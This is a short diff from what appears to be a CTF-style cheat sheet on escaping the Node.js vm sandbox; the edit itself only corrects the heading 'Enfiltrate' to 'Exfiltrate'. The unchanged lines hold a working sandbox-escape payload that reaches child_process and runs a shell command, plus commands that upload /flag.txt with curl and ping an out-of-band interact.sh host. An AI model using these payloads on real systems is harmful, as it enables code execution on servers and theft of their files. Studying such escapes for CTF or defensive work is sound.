@@ -20,7 +20,7 @@ Escape Node VM Sandbox
 
     this.constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id").toString()
 
-### Enfiltrate
+### Exfiltrate
 
     curl -T /flag.txt xxxx.interct.sh
     ping here.xxx.interact.sh
